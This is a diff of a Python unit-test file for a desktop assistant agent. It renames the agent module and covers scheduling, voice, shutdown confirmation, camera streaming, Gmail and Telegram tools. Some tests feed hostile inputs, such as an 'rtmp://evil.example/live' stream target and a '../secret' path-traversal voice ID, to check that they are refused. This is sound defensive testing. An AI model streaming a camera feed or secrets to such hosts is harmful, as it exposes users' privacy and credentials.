-        specs = gta5_agent.local_search.file_content_rag_search(
+        specs = agent_core.local_search.file_content_rag_search(
             "What are the specs listed in my project notes file?"
         )
         self.assertTrue(specs["ok"], specs)
         self.assertIn("aluminum", json.dumps(specs["matches"]).casefold())
 
-        old = gta5_agent.task_schedule.schedule_background_task(
+        old = agent_core.task_schedule.schedule_background_task(
             "health_check",
             delay_minutes=5,
         )
         self.assertFalse(old["ok"])
         self.assertIn("organize_downloads, reindex_files, or remind", old["error"])
-        game_copy = gta5_agent.task_schedule.job_scheduler(
+        game_copy = agent_core.task_schedule.job_scheduler(
             "full backup of the game",
             daily_at="02:00",
         )
@@ -4625,8 +4619,8 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("notes", game_copy["error"].casefold())
         moment = datetime(2026, 10, 11, 1, 0, 0).timestamp()
         clock = {"now": moment}
-        gta5_agent.scheduler_clock = lambda: clock["now"]
-        nightly = gta5_agent.task_schedule.job_scheduler(
+        agent_core.scheduler_clock = lambda: clock["now"]
+        nightly = agent_core.task_schedule.job_scheduler(
             "remind",
             daily_at="02:00",
             message="check the notes",
@@ -4634,22 +4628,22 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(nightly["ok"], nightly)
         self.assertIn("02:00", nightly["rule"])
         clock["now"] = datetime(2026, 10, 11, 2, 0, 0).timestamp()
-        reminded = gta5_agent.task_schedule.run_due_tasks()
+        reminded = agent_core.task_schedule.run_due_tasks()
         self.assertTrue(reminded[0]["ok"], reminded)
-        gta5_agent.diagnostics_override = lambda: {
+        agent_core.diagnostics_override = lambda: {
             "cpu_percent": 3,
             "ram_percent": 10,
             "ram_used_mb": 100,
             "ram_total_mb": 1000,
             "processes": [],
         }
-        health_job = gta5_agent.task_schedule.job_scheduler(
+        health_job = agent_core.task_schedule.job_scheduler(
             "health_check",
             delay_minutes=1,
         )
         self.assertTrue(health_job["ok"], health_job)
         clock["now"] += 60
-        checked = gta5_agent.task_schedule.run_due_tasks()
+        checked = agent_core.task_schedule.run_due_tasks()
         self.assertIn("CPU", checked[0]["message"])
         from PIL import Image
 
@@ -4668,33 +4662,33 @@ class AgentToolTests(unittest.TestCase):
             sent.append(kind)
             return {"ok": True, "result": {"photo": [{"file_id": "1"}]}}
 
-        gta5_agent.screenshot_override = screenshot
-        gta5_agent.remote_transport_override = transport
+        agent_core.screenshot_override = screenshot
+        agent_core.remote_transport_override = transport
         os.environ["TELEGRAM_BOT_TOKEN"] = "test-token"
         os.environ["TELEGRAM_CHAT_ID"] = "1"
-        photo_job = gta5_agent.task_schedule.job_scheduler(
+        photo_job = agent_core.task_schedule.job_scheduler(
             "screenshot_to_phone",
             delay_minutes=1,
         )
         self.assertTrue(photo_job["ok"], photo_job)
         clock["now"] += 60
-        delivered = gta5_agent.task_schedule.run_due_tasks()
+        delivered = agent_core.task_schedule.run_due_tasks()
         self.assertTrue(delivered[0]["ok"], delivered)
         self.assertEqual(shots["n"], 1)
         self.assertIn("telegram_photo", sent)
         (root / "only-notes.txt").write_text("hello notes", encoding="utf-8")
-        backup_job = gta5_agent.task_schedule.job_scheduler("backup", delay_minutes=1)
+        backup_job = agent_core.task_schedule.job_scheduler("backup", delay_minutes=1)
         self.assertTrue(backup_job["ok"], backup_job)
         clock["now"] += 60
-        copied = gta5_agent.task_schedule.run_due_tasks()
+        copied = agent_core.task_schedule.run_due_tasks()
         self.assertTrue(copied[0]["ok"], copied)
-        backup_root = gta5_agent.WORKSPACE / "backups" / "notes"
+        backup_root = agent_core.WORKSPACE / "backups" / "notes"
         self.assertTrue((backup_root / "only-notes.txt").is_file())
         self.assertFalse(any(path.suffix == ".exe" for path in backup_root.rglob("*")))
         self.assertFalse(any(path.name == ".env" for path in backup_root.rglob("*")))
 
         focused: list[dict[str, object]] = []
-        gta5_agent.window_override = lambda kind, payload: focused.append(dict(payload or {}))
+        agent_core.window_override = lambda kind, payload: focused.append(dict(payload or {}))
         saved = routine_macros.routine_macro_engine(
             "save",
             "3D-Export",
@@ -4724,20 +4718,20 @@ class AgentToolTests(unittest.TestCase):
         import voice_checkin
 
         clock = {"now": 1_000.0}
-        gta5_agent.scheduler_clock = lambda: clock["now"]
+        agent_core.scheduler_clock = lambda: clock["now"]
         voice_checkin.reset()
-        gta5_agent.voice_mode_active = False
-        gta5_agent.idle_seconds_override = 30 * 60
+        agent_core.voice_mode_active = False
+        agent_core.idle_seconds_override = 30 * 60
         self.assertIsNone(voice_checkin.maybe_check_in())
         spoken: list[str] = []
-        gta5_agent.checkin_speaker_override = spoken.append
-        gta5_agent.checkin_listener_override = lambda: "Yeah, I'm good, just thinking"
-        gta5_agent.voice_mode_active = True
-        gta5_agent.idle_seconds_override = 0
+        agent_core.checkin_speaker_override = spoken.append
+        agent_core.checkin_listener_override = lambda: "Yeah, I'm good, just thinking"
+        agent_core.voice_mode_active = True
+        agent_core.idle_seconds_override = 0
         self.assertIsNone(voice_checkin.maybe_check_in())
         self.assertEqual(spoken, [])
-        gta5_agent.checkin_idle_minutes_override = 15
-        gta5_agent.idle_seconds_override = 15 * 60
+        agent_core.checkin_idle_minutes_override = 15
+        agent_core.idle_seconds_override = 15 * 60
         self.assertIsNone(voice_checkin.maybe_check_in())
         clock["now"] += 15 * 60
         heard = voice_checkin.maybe_check_in()
@@ -4747,7 +4741,7 @@ class AgentToolTests(unittest.TestCase):
         again = voice_checkin.maybe_check_in()
         self.assertIsNone(again)
         self.assertEqual(len(spoken), 2)
-        gta5_agent.checkin_listener_override = lambda: ""
+        agent_core.checkin_listener_override = lambda: ""
         clock["now"] += 15 * 60
         quiet = voice_checkin.maybe_check_in()
         self.assertEqual(quiet, "quiet")
@@ -4755,12 +4749,12 @@ class AgentToolTests(unittest.TestCase):
         nag = voice_checkin.maybe_check_in()
         self.assertIsNone(nag)
         self.assertEqual(len(spoken), 3)
-        gta5_agent.idle_seconds_override = 0
+        agent_core.idle_seconds_override = 0
         self.assertIsNone(voice_checkin.maybe_check_in())
-        gta5_agent.idle_seconds_override = 15 * 60
+        agent_core.idle_seconds_override = 15 * 60
         self.assertIsNone(voice_checkin.maybe_check_in())
         clock["now"] += 15 * 60
-        gta5_agent.checkin_listener_override = lambda: "all good"
+        agent_core.checkin_listener_override = lambda: "all good"
         follow = voice_checkin.maybe_check_in()
         self.assertEqual(follow, "reply")
         self.assertEqual(spoken[-1], voice_checkin.ACK)
@@ -4769,7 +4763,7 @@ class AgentToolTests(unittest.TestCase):
         import emotion
 
         sample = "[giggles] Oh stop, that's hilarious! [laughs] I didn't see that coming."
-        spoken_text = gta5_agent.clean_text_for_tts(sample)
+        spoken_text = agent_core.clean_text_for_tts(sample)
         self.assertNotIn("[", spoken_text)
         self.assertNotIn("]", spoken_text)
         self.assertNotIn("giggles", spoken_text.casefold())
@@ -4782,13 +4776,13 @@ class AgentToolTests(unittest.TestCase):
         )
         emotion.reset()
         self.assertEqual(
-            gta5_agent.clean_text_for_tts("Wait... that is HUGE!"),
+            agent_core.clean_text_for_tts("Wait... that is HUGE!"),
             "Wait... that is HUGE!",
         )
         self.assertEqual(emotion.current(), "excited")
         self.assertTrue(emotion.delivery()[0].startswith("+"))
         emotion.reset()
-        self.assertEqual(gta5_agent.clean_text_for_tts("Wait... I think so."), "Wait... I think so.")
+        self.assertEqual(agent_core.clean_text_for_tts("Wait... I think so."), "Wait... I think so.")
         self.assertEqual(emotion.current(), "pause")
         self.assertTrue(emotion.delivery()[0].startswith("-"))
 
@@ -4798,8 +4792,8 @@ class AgentToolTests(unittest.TestCase):
             heard.append(text)
             destination.write_bytes(b"mp3")
 
-        gta5_agent.begin_task_turn("Laugh for me")
-        laugh = gta5_agent.speak_response(
+        agent_core.begin_task_turn("Laugh for me")
+        laugh = agent_core.speak_response(
             "[laughs] Here is one.",
             synthesizer=synthesize,
             player=lambda path: None,
@@ -4810,8 +4804,8 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("Ha ha ha", heard[0])
         self.assertEqual(laugh["emotion"], "laugh")
         self.assertTrue(str(laugh["rate"]).startswith("+"))
-        gta5_agent.begin_task_turn("I feel awful and this is bad news")
-        soft = gta5_agent.speak_response(
+        agent_core.begin_task_turn("I feel awful and this is bad news")
+        soft = agent_core.speak_response(
             "[softly] Oh, I'm so sorry. That really is tough.",
             synthesizer=synthesize,
             player=lambda path: None,
@@ -4823,7 +4817,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(str(soft["rate"]).startswith("-"))
         self.assertEqual(emotion.detect_emotion("Tell me a joke"), "laugh")
         self.assertEqual(emotion.detect_emotion("That joke was hilarious"), "cheerful")
-        self.assertEqual(gta5_agent.clean_text_for_tts("Wait [pause] there."), "Wait ... there.")
+        self.assertEqual(agent_core.clean_text_for_tts("Wait [pause] there."), "Wait ... there.")
 
     def test_cloud_male_voice_keeps_tags_and_falls_back(self) -> None:
         import tts_engine
@@ -4845,9 +4839,9 @@ class AgentToolTests(unittest.TestCase):
         os.environ["ELEVENLABS_STYLE"] = "0.99"
         os.environ["VOICE_ID"] = "../secret"
         tagged = "[chuckles] Wait... one moment - hello. [pause]"
-        self.assertIn("[chuckles]", gta5_agent.clean_text_for_tts(tagged))
-        self.assertIn("[pause]", gta5_agent.clean_text_for_tts(tagged))
-        self.assertNotIn("elevenlabs", gta5_agent.SYSTEM_PROMPT.casefold())
+        self.assertIn("[chuckles]", agent_core.clean_text_for_tts(tagged))
+        self.assertIn("[pause]", agent_core.clean_text_for_tts(tagged))
+        self.assertNotIn("elevenlabs", agent_core.SYSTEM_PROMPT.casefold())
 
         played: list[bytes] = []
 
@@ -4856,7 +4850,7 @@ class AgentToolTests(unittest.TestCase):
 
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real speech")):
             with mock.patch("urllib.request.build_opener", side_effect=AssertionError("real speech")):
-                spoken = gta5_agent.speak_response(tagged, player=play)
+                spoken = agent_core.speak_response(tagged, player=play)
         self.assertTrue(spoken["ok"], spoken)
         self.assertEqual(played, [audio])
         self.assertEqual(spoken["voice"], tts_engine.DEFAULT_VOICE_ID)
@@ -4880,7 +4874,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertNotIn("secret", str(spec["url"]))
 
         os.environ["ELEVENLABS_MODEL"] = "eleven_multilingual_v2"
-        self.assertNotIn("[", gta5_agent.clean_text_for_tts("[sighs] Okay."))
+        self.assertNotIn("[", agent_core.clean_text_for_tts("[sighs] Okay."))
         os.environ["ELEVENLABS_MODEL"] = "eleven_v3"
 
         os.environ["ELEVEN_DOWN"] = "1"
@@ -4893,8 +4887,8 @@ class AgentToolTests(unittest.TestCase):
             destination.write_bytes(b"local-mp3-bytes")
 
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real speech")):
-            with mock.patch.object(gta5_agent, "_synthesize_neural_speech", fake_edge):
-                failed_over = gta5_agent.speak_response(
+            with mock.patch.object(agent_core, "_synthesize_neural_speech", fake_edge):
+                failed_over = agent_core.speak_response(
                     "[chuckles] Hello there.",
                     player=lambda path: None,
                 )
@@ -4913,7 +4907,7 @@ class AgentToolTests(unittest.TestCase):
         os.environ["DEEPGRAM_API_KEY"] = "deepgram-test-key"
         calls.clear()
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real speech")):
-            deepgram = gta5_agent.speak_response("Hello there.", player=lambda path: None)
+            deepgram = agent_core.speak_response("Hello there.", player=lambda path: None)
         self.assertTrue(deepgram["ok"], deepgram)
         self.assertEqual(calls[-1]["engine"], "deepgram")
         self.assertIn("model=aura-2-orion-en", str(calls[-1]["url"]))
@@ -4945,7 +4939,7 @@ class AgentToolTests(unittest.TestCase):
         os.environ.pop("DEEPGRAM_API_KEY", None)
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real speech")):
             with mock.patch.dict(sys.modules, {"edge_tts": fake_module}):
-                local = gta5_agent.speak_response(
+                local = agent_core.speak_response(
                     "[chuckles] Hello there.",
                     player=lambda path: None,
                 )
@@ -4959,9 +4953,9 @@ class AgentToolTests(unittest.TestCase):
     def test_shutdown_computer_waits_for_yes(self) -> None:
         import power_control
 
-        self.assertFalse(gta5_agent._request_needs_plan("Shut down the PC"))
+        self.assertFalse(agent_core._request_needs_plan("Shut down the PC"))
         self.assertTrue(
-            gta5_agent._request_needs_plan("Shut down the PC and update my spreadsheet")
+            agent_core._request_needs_plan("Shut down the PC and update my spreadsheet")
         )
         commands: list[list[str]] = []
 
@@ -4969,56 +4963,56 @@ class AgentToolTests(unittest.TestCase):
             commands.append(list(command))
             return {"returncode": 0, "stdout": "", "stderr": ""}
 
-        gta5_agent.shutdown_runner_override = runner
-        gta5_agent.voice_mode_active = False
-        gta5_agent.begin_task_turn("Shut down the PC")
+        agent_core.shutdown_runner_override = runner
+        agent_core.voice_mode_active = False
+        agent_core.begin_task_turn("Shut down the PC")
         with mock.patch("power_control.subprocess.run", side_effect=AssertionError("real shutdown")):
-            waiting = gta5_agent.invoke_tool("shutdown_computer", {})
+            waiting = agent_core.invoke_tool("shutdown_computer", {})
             self.assertTrue(waiting.get("needs_confirmation"))
             self.assertEqual(commands, [])
-            gta5_agent.begin_task_turn("yes")
-            started = gta5_agent.invoke_tool("shutdown_computer", {})
+            agent_core.begin_task_turn("yes")
+            started = agent_core.invoke_tool("shutdown_computer", {})
         self.assertTrue(started["ok"], started)
         self.assertEqual(started["message"], "Shutting down this PC.")
         self.assertEqual(commands, [["shutdown", "/s", "/t", "0"]])
 
         spoken: list[str] = []
-        gta5_agent.voice_mode_active = True
-        gta5_agent.confirm_speaker_override = spoken.append
-        gta5_agent.confirm_listener_override = lambda: "no"
+        agent_core.voice_mode_active = True
+        agent_core.confirm_speaker_override = spoken.append
+        agent_core.confirm_listener_override = lambda: "no"
         with mock.patch("power_control.subprocess.run", side_effect=AssertionError("real shutdown")):
-            denied = gta5_agent.invoke_tool("shutdown_computer", {})
+            denied = agent_core.invoke_tool("shutdown_computer", {})
         self.assertFalse(denied["ok"])
         self.assertFalse(denied.get("approved"))
         self.assertIn("shut down this PC", spoken[0])
         self.assertEqual(len(commands), 1)
 
-        gta5_agent.confirm_listener_override = lambda: "yes"
+        agent_core.confirm_listener_override = lambda: "yes"
         with mock.patch("power_control.subprocess.run", side_effect=AssertionError("real shutdown")):
-            allowed = gta5_agent.invoke_tool("shutdown_computer", {})
+            allowed = agent_core.invoke_tool("shutdown_computer", {})
         self.assertTrue(allowed["ok"], allowed)
         self.assertEqual(len(commands), 2)
 
-        gta5_agent.shutdown_runner_override = lambda command: {
+        agent_core.shutdown_runner_override = lambda command: {
             "returncode": 1,
             "stdout": "",
             "stderr": "Access is denied.",
         }
-        gta5_agent.confirm_listener_override = lambda: "yes"
-        refused = gta5_agent.invoke_tool("shutdown_computer", {})
+        agent_core.confirm_listener_override = lambda: "yes"
+        refused = agent_core.invoke_tool("shutdown_computer", {})
         self.assertFalse(refused["ok"])
         self.assertIn("did not shut down", refused["error"])
 
-        gta5_agent.shutdown_runner_override = _guard_shutdown
+        agent_core.shutdown_runner_override = _guard_shutdown
         with self.assertRaises(AssertionError) as guard:
             power_control.shutdown_computer()
         self.assertIn("real shutdown", str(guard.exception))
-        gta5_agent.voice_mode_active = False
+        agent_core.voice_mode_active = False
 
     def test_array_tool_parameters_include_item_schemas(self) -> None:
         from google.genai import types as genai_types
 
-        tool = genai_types.Tool(function_declarations=gta5_agent.TOOL_DECLARATIONS)
+        tool = genai_types.Tool(function_declarations=agent_core.TOOL_DECLARATIONS)
         missing: list[str] = []
 
         def walk(schema: object, path: str) -> None:
@@ -5048,16 +5042,16 @@ class AgentToolTests(unittest.TestCase):
             "Headphones (JBL TUNE510BT Stereo)",
             "Speakers (Realtek High Definition Audio)",
         ]
-        chosen = gta5_agent.preferred_output_device(names)
+        chosen = agent_core.preferred_output_device(names)
         self.assertEqual(chosen, "Headphones (JBL TUNE510BT Stereo)")
-        self.assertTrue(gta5_agent.playback_should_skip_barge(names, chosen))
+        self.assertTrue(agent_core.playback_should_skip_barge(names, chosen))
         speakers = ["Speakers (Realtek High Definition Audio)"]
-        speaker = gta5_agent.preferred_output_device(speakers)
+        speaker = agent_core.preferred_output_device(speakers)
         self.assertEqual(speaker, "Speakers (Realtek High Definition Audio)")
-        self.assertFalse(gta5_agent.playback_should_skip_barge(speakers, speaker))
+        self.assertFalse(agent_core.playback_should_skip_barge(speakers, speaker))
 
-        gta5_agent.audio_output_override = names
-        gta5_agent._barge_skip_announced = False
+        agent_core.audio_output_override = names
+        agent_core._barge_skip_announced = False
         played: list[bool] = []
 
         def player(stop_event: threading.Event) -> None:
@@ -5066,9 +5060,9 @@ class AgentToolTests(unittest.TestCase):
         def boom(*args: object, **kwargs: object) -> None:
             raise AssertionError("real microphone")
 
-        with mock.patch.object(gta5_agent, "_collect_barge_from_microphone", boom):
+        with mock.patch.object(agent_core, "_collect_barge_from_microphone", boom):
             result = asyncio.run(
-                gta5_agent._barge_during_playback(
+                agent_core._barge_during_playback(
                     self.root / "reply.mp3",
                     player=player,
                 )
@@ -5083,8 +5077,8 @@ class AgentToolTests(unittest.TestCase):
 
         from PIL import Image
 
-        bridge = gta5_agent.remote_bridge
-        video = gta5_agent.live_video
+        bridge = agent_core.remote_bridge
+        video = agent_core.live_video
         self.assertTrue(bridge.wants_pc_camera("/pc_camera"))
         self.assertTrue(bridge.wants_pc_camera("/pc_camera@desk_bot"))
         self.assertTrue(bridge.wants_pc_camera("Show me what your computer camera sees"))
@@ -5102,28 +5096,28 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(bridge.wants_stop_camera("stop live video"))
         self.assertFalse(bridge.wants_stop_camera("stop the camera and organize my files"))
         self.assertFalse(bridge.wants_pc_camera("show me my screen"))
-        self.assertIn("stream_pc_camera", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("stream_phone_camera", gta5_agent.SYSTEM_PROMPT)
-        self.assertNotIn("stream_pc_camera", gta5_agent._PLAN_FREE_TOOLS)
-        self.assertNotIn("stream_phone_camera", gta5_agent._PLAN_FREE_TOOLS)
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
+        self.assertIn("stream_pc_camera", agent_core.SYSTEM_PROMPT)
+        self.assertIn("stream_phone_camera", agent_core.SYSTEM_PROMPT)
+        self.assertNotIn("stream_pc_camera", agent_core._PLAN_FREE_TOOLS)
+        self.assertNotIn("stream_phone_camera", agent_core._PLAN_FREE_TOOLS)
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
         self.assertEqual(names[48], "desktop_ui_automation")
         self.assertEqual(names[53], "routine_macro_engine")
         self.assertLess(names.index("routine_macro_engine"), names.index("stream_pc_camera"))
         self.assertFalse(
-            gta5_agent._request_needs_plan("Show me what your computer camera sees")
+            agent_core._request_needs_plan("Show me what your computer camera sees")
         )
         self.assertFalse(
-            gta5_agent._request_needs_plan(
+            agent_core._request_needs_plan(
                 "Go to this link, log in, and download the latest data report"
             )
         )
-        gta5_agent.begin_task_turn("organize my folder and update my spreadsheet")
-        blocked = gta5_agent.invoke_tool("stream_pc_camera", {"action": "start"})
+        agent_core.begin_task_turn("organize my folder and update my spreadsheet")
+        blocked = agent_core.invoke_tool("stream_pc_camera", {"action": "start"})
         self.assertFalse(blocked["ok"])
         self.assertIn("create_task_plan", blocked["error"])
-        gta5_agent.begin_task_turn("")
-        refused = gta5_agent.invoke_tool(
+        agent_core.begin_task_turn("")
+        refused = agent_core.invoke_tool(
             "stream_pc_camera",
             {"rtmp_url": "rtmp://evil.example/live", "stream_key": "secretkey12"},
         )
@@ -5196,9 +5190,9 @@ class AgentToolTests(unittest.TestCase):
                 raise AssertionError("real network")
             return real_urlopen(target, timeout=timeout)
 
-        gta5_agent.live_frame_override = lambda: jpeg
-        gta5_agent.stream_process_override = fake_process
-        gta5_agent.remote_transport_override = transport
+        agent_core.live_frame_override = lambda: jpeg
+        agent_core.stream_process_override = fake_process
+        agent_core.remote_transport_override = transport
         os.environ["TELEGRAM_BOT_TOKEN"] = "phone-token-value"
         os.environ["TELEGRAM_CHAT_ID"] = "42"
         try:
@@ -5296,7 +5290,7 @@ class AgentToolTests(unittest.TestCase):
                 self.assertTrue(published["mini_app"])
                 self.assertNotIn("super-secret-key", json.dumps(published))
                 self.assertNotIn("rtmp://live.example/live", json.dumps(published))
-                self.assertIn("[redacted]", gta5_agent._scrub("failed super-secret-key"))
+                self.assertIn("[redacted]", agent_core._scrub("failed super-secret-key"))
                 self.assertEqual(len(commands), 1)
                 self.assertEqual(commands[0][-3:], ["-f", "flv", "rtmp://live.example/live/super-secret-key"])
                 self.assertNotIn("shell", commands[0])
@@ -5332,8 +5326,8 @@ class AgentToolTests(unittest.TestCase):
                     replies.append(text)
                     return "One look is a single frame."
 
-                gta5_agent.remote_reply_override = reply
-                gta5_agent.live_frame_override = lambda: jpeg
+                agent_core.remote_reply_override = reply
+                agent_core.live_frame_override = lambda: jpeg
 
                 def updates(kind: str, payload: dict[str, object]) -> dict[str, object]:
                     if kind == "telegram_updates":
@@ -5368,7 +5362,7 @@ class AgentToolTests(unittest.TestCase):
                 os.environ.pop("TELEGRAM_STREAM_KEY", None)
                 os.environ.pop("LIVE_PUBLIC_URL", None)
                 sent.clear()
-                gta5_agent.remote_transport_override = updates
+                agent_core.remote_transport_override = updates
                 checked = bridge.poll_once()
                 self.assertTrue(checked["ok"], checked)
                 self.assertEqual(checked["replied"], 2)
@@ -5386,13 +5380,13 @@ class AgentToolTests(unittest.TestCase):
             video.stop_live_feeds()
 
     def test_gmail_sends_an_address_and_looks_up_a_name(self) -> None:
-        mail = gta5_agent.gmail_mail
+        mail = agent_core.gmail_mail
         contacts = [
             {"name": "John Doe", "email": "john.doe@example.com"},
             {"name": "John Smith", "email": "john.smith@example.com"},
             {"name": "Sarah", "email": "sarah@example.com"},
         ]
-        gta5_agent.contacts_override = contacts
+        agent_core.contacts_override = contacts
         sent: list[dict[str, object]] = []
 
         def transport(payload: dict[str, object]) -> dict[str, object]:
@@ -5401,7 +5395,7 @@ class AgentToolTests(unittest.TestCase):
             sent.append(payload)
             return {"ok": True}
 
-        gta5_agent.gmail_transport_override = transport
+        agent_core.gmail_transport_override = transport
         os.environ["GMAIL_ADDRESS"] = "owner@example.com"
         os.environ["GMAIL_APP_PASSWORD"] = "app-password-value"
         try:
@@ -5456,37 +5450,37 @@ class AgentToolTests(unittest.TestCase):
                 self.assertFalse(secret["ok"])
                 self.assertIn("saved secret", secret["error"])
                 self.assertEqual(sent, [])
-                self.assertIn("[redacted]", gta5_agent._scrub("app-password-value"))
+                self.assertIn("[redacted]", agent_core._scrub("app-password-value"))
 
-                gta5_agent.begin_task_turn("Send an email to Sarah and update my spreadsheet")
-                blocked = gta5_agent.invoke_tool(
+                agent_core.begin_task_turn("Send an email to Sarah and update my spreadsheet")
+                blocked = agent_core.invoke_tool(
                     "gmail_send_message",
                     {"to": "Sarah", "body": "hello"},
                 )
                 self.assertFalse(blocked["ok"])
                 self.assertIn("create_task_plan", blocked["error"])
                 self.assertEqual(sent, [])
-                gta5_agent.begin_task_turn("Send an email to sarah@example.com saying hello")
-                self.assertFalse(gta5_agent._request_needs_plan(gta5_agent._turn_request))
+                agent_core.begin_task_turn("Send an email to sarah@example.com saying hello")
+                self.assertFalse(agent_core._request_needs_plan(agent_core._turn_request))
                 self.assertFalse(
-                    gta5_agent._request_needs_plan(
+                    agent_core._request_needs_plan(
                         "Go to this link, log in, and download the latest data report"
                     )
                 )
-                refused = gta5_agent.invoke_tool(
+                refused = agent_core.invoke_tool(
                     "gmail_send_message",
                     {"to": "sarah@example.com", "body": "hi", "app_password": "app-password-value"},
                 )
                 self.assertFalse(refused["ok"])
                 self.assertIn("Bad arguments", refused["error"])
-                names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
+                names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
                 self.assertEqual(names[48], "desktop_ui_automation")
                 self.assertEqual(names[53], "routine_macro_engine")
-                self.assertNotIn("gmail_send_message", gta5_agent._PLAN_FREE_TOOLS)
-                self.assertIn("gmail_send_message", gta5_agent.SYSTEM_PROMPT)
-                self.assertIn("people_contact_search", gta5_agent.SYSTEM_PROMPT)
+                self.assertNotIn("gmail_send_message", agent_core._PLAN_FREE_TOOLS)
+                self.assertIn("gmail_send_message", agent_core.SYSTEM_PROMPT)
+                self.assertIn("people_contact_search", agent_core.SYSTEM_PROMPT)
 
-                gta5_agent.gmail_transport_override = None
+                agent_core.gmail_transport_override = None
                 os.environ.pop("GMAIL_ADDRESS", None)
                 os.environ.pop("GMAIL_APP_PASSWORD", None)
                 quiet = mail.gmail_send_message(to="sarah@example.com", body="hi")
@@ -5498,7 +5492,7 @@ class AgentToolTests(unittest.TestCase):
             os.environ.pop("GMAIL_APP_PASSWORD", None)
 
     def test_telegram_voice_notes_answer_in_the_chat(self) -> None:
-        bridge = gta5_agent.remote_bridge
+        bridge = agent_core.remote_bridge
         token = "phone-token-value"
         hook = "https://discord.com/api/webhooks/9/phone-hook-value"
         os.environ["TELEGRAM_BOT_TOKEN"] = token
@@ -5558,8 +5552,8 @@ class AgentToolTests(unittest.TestCase):
                 with mock.patch("urllib.request.build_opener", side_effect=AssertionError("real network")):
                     return bridge.poll_once()
 
-        gta5_agent.remote_transport_override = transport
-        gta5_agent.telegram_voice_transcriber_override = lambda data: (
+        agent_core.remote_transport_override = transport
+        agent_core.telegram_voice_transcriber_override = lambda data: (
             "send an email to sarah@example.com saying the report is ready"
             if data.startswith(b"OggS")
             else ""
@@ -5570,7 +5564,7 @@ class AgentToolTests(unittest.TestCase):
             ran.append(user_text)
             return "This reply must not be sent."
 
-        with mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run):
+        with mock.patch.object(agent_core, "run_agent", side_effect=fake_run):
             checked = poll([voice_message(11)])
         self.assertTrue(checked["ok"], checked)
         self.assertEqual(checked["replied"], 0)
@@ -5586,10 +5580,10 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(voice_sends[0][1]["body"]["text"], "This reply must not be sent.")
         self.assertNotIn("please reply in the chat", json.dumps(voice_sends))
         self.assertNotIn("voice", json.dumps(voice_sends[0][1]))
-        self.assertIn("voice note", gta5_agent.SYSTEM_PROMPT.casefold())
+        self.assertIn("voice note", agent_core.SYSTEM_PROMPT.casefold())
 
         os.environ["TELEGRAM_VOICE_REACTION"] = "👍"
-        with mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run):
+        with mock.patch.object(agent_core, "run_agent", side_effect=fake_run):
             reacted = poll([voice_message(12)])
         self.assertEqual(reacted["voice"], 1)
         self.assertEqual(seen[3][0], "telegram_reaction")
@@ -5599,7 +5593,7 @@ class AgentToolTests(unittest.TestCase):
 
         os.environ["TELEGRAM_VOICE_REACTION"] = "hello"
         ran.clear()
-        with mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run):
+        with mock.patch.object(agent_core, "run_agent", side_effect=fake_run):
             quiet = poll([voice_message(13)])
         self.assertEqual(quiet["voice"], 1)
         self.assertEqual(ran, ["send an email to sarah@example.com saying the report is ready"])
@@ -5612,7 +5606,7 @@ class AgentToolTests(unittest.TestCase):
         os.environ["TELEGRAM_VOICE_REACTION"] = "👍"
         reaction_error["on"] = True
         ran.clear()
-        with mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run):
+        with mock.patch.object(agent_core, "run_agent", side_effect=fake_run):
             with mock.patch("builtins.print"):
                 failed_react = poll([voice_message(14)])
         self.assertEqual(failed_react["voice"], 1)
@@ -5626,7 +5620,7 @@ class AgentToolTests(unittest.TestCase):
             heard.append(text)
             return f"reply:{text}"
 
-        gta5_agent.remote_reply_override = remember
+        agent_core.remote_reply_override = remember
         mixed = poll(
             [
                 voice_message(15),
@@ -5675,19 +5669,19 @@ class AgentToolTests(unittest.TestCase):
                 return {"ok": True, "data": b"not-an-ogg-file!!!!"}
             return saved_download(kind, payload)
 
-        gta5_agent.remote_transport_override = bad_audio
+        agent_core.remote_transport_override = bad_audio
         heard.clear()
         not_ogg = poll([voice_message(19)])
         self.assertEqual(not_ogg["voice"], 0)
         self.assertEqual(heard, [])
         self.assertNotIn("telegram_send", [item[0] for item in seen])
-        gta5_agent.remote_transport_override = transport
+        agent_core.remote_transport_override = transport
 
         too_long = poll([voice_message(20, duration=601)])
         self.assertEqual(too_long["voice"], 0)
         self.assertEqual([item[0] for item in seen], ["telegram_updates"])
 
-        gta5_agent.telegram_voice_transcriber_override = lambda data: "..."
+        agent_core.telegram_voice_transcriber_override = lambda data: "..."
         heard.clear()
         silent = poll([voice_message(21)])
         self.assertEqual(silent["voice"], 0)
@@ -5733,13 +5727,13 @@ class AgentToolTests(unittest.TestCase):
 
         saved_key = os.environ.get("GEMINI_API_KEY")
         os.environ["GEMINI_API_KEY"] = "gemini-test-key"
-        gta5_agent.telegram_voice_transcriber_override = None
-        gta5_agent.remote_reply_override = None
-        gta5_agent.genai_client_override = client_factory
+        agent_core.telegram_voice_transcriber_override = None
+        agent_core.remote_reply_override = None
+        agent_core.genai_client_override = client_factory
         ran.clear()
         try:
             with mock.patch.object(bridge, "_local_whisper_text", return_value=None):
-                with mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run):
+                with mock.patch.object(agent_core, "run_agent", side_effect=fake_run):
                     gemini = poll([voice_message(22)])
             self.assertEqual(gemini["voice"], 1)
             self.assertEqual(ran, ["launch the background render"])
@@ -5756,7 +5750,7 @@ class AgentToolTests(unittest.TestCase):
             os.environ["PRIVACY_MODE"] = "1"
             ran.clear()
             with mock.patch.object(bridge, "_local_whisper_text", return_value=None):
-                with mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run):
+                with mock.patch.object(agent_core, "run_agent", side_effect=fake_run):
                     private = poll([voice_message(23)])
